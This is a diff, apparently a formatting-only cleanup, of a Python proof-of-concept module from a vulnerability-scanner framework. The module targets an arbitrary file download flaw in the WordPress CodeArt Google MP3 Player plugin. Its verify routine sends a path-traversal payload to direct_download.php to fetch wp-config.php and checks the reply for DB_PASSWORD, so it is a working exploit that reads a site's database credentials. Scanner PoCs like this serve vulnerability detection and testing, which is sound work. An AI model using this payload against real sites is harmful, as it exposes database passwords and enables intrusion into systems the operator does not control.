@@ -6,11 +6,12 @@ import re
 import urllib
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0014' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0014'  # 平台漏洞编号，留空
     name = 'WordPress CodeArt Google MP3 Player Plugin 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-12-03'  # 漏洞公布时间
     desc = '''
          WordPress CodeArt Google MP3 Player Plugin has file download in do/direct_download.php.
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress CodeArt Google MP3 Player Plugin <=1.0.11'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '35f3da58-cda1-4ab4-abd2-8dbac9d0503f'
@@ -33,7 +35,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = 'file=../../../wp-config.php'
             path = '/wp-content/plugins/google-mp3-audio-player/direct_download.php?'
             verify_url = self.target + path + payload
@@ -42,14 +44,15 @@ class Poc(ABPoc):
             response = urllib2.urlopen(request)
             reg = re.compile("DB_PASSWORD")
             if reg.findall(response.read()):
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
